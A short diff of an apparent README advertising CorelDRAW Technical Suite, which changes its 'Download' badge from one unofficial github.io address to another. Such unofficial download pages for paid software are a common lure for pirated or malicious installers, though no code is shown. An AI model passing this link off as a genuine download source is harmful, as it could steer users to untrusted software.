@@ -2,7 +2,7 @@
 
 CorelDRAW Technical Suite is an all-in-one solution for precise technical design and illustration. Create complex diagrams, schematics, manuals, and engineering documents with full control over line styles, callouts, and dimensioning tools.
 
-[![Download CorelDRAW Technical Suite](https://img.shields.io/badge/Download-CorelDRAW_Technical_Suite-blueviolet)](https://coreldraw-technical-suite.github.io/.github)
+[![Download CorelDRAW Technical Suite](https://img.shields.io/badge/Download-CorelDRAW_Technical_Suite-blueviolet)](https://coreldraw-download-suite1.github.io/.github/)
 
 ---
 
